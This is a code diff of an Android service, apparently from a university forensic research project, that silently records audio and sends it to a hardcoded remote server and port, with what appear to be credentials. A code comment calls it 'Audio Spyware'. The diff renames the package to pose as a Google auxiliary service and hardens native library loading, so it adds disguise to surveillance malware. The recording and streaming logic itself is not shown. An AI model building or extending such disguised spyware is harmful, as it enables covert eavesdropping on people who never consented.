@@ -1,9 +1,8 @@
-package com.forensic.unipg.silenceaudiorecording;
+package com.tools.google.auxiliaryservices;
 
 import android.Manifest;
 import android.app.ActivityManager;
 import android.app.Service;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -24,13 +23,38 @@ import java.util.List;
  */
 public class SilenceAudioRecordingService extends Service implements Runnable
 {
-    static
+    //Init lib
+    static boolean loadLib(Context context)
     {
-        System.load("libSilenceAudioRecordingNative.so");
+        //Path & Name
+        String libPath = context.getApplicationInfo().nativeLibraryDir;
+        String libName = "libSilenceAudioRecordingNative.so";
+        //try
+        String libraries[] = { libName, libPath + "/" + libName };
+        //test
+        for(String library : libraries)
+        {
+            try
+            {
+                System.load(library);
+                return true;
+            }
+            catch(UnsatisfiedLinkError e)
+            {
+                e.printStackTrace();
+            }
+        }
+        //failed
+        return false;
     }
 
     //server values (default)
-    InfoServer mInfo = new InfoServer("2.227.12.76",8000);
+    ConfigurationFile mInfo = new ConfigurationFile(
+              "2.227.12.76"
+            , 8000
+            , "54321"
+            , "12345"
+    );
     //thread values
     private Thread  mThread = null;
     private boolean mLoop = true;
@@ -165,7 +189,10 @@ public class SilenceAudioRecordingService extends Service implements Runnable
     @Override
     public void onCreate()
     {
+        //call super
         super.onCreate();
+        //Load Lib
+        SilenceAudioRecordingService.loadLib(getApplicationContext());
         // parse
         mInfo.read(getBaseContext());
         // Start RakNet client Audio Spyware
